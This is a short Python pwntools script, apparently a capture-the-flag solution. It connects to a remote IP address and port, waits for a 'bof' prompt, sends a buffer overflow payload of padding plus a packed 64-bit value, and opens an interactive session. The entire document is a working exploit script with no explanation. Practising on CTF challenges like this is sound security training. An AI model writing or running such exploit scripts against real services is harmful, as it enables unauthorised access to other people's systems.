from pwn import *

payload = 'aaaa' + p64(1853186401)

p = remote('220.249.52.133','30169')
p.recvuntil('bof\n')
p.sendline(payload)
p.interactive()
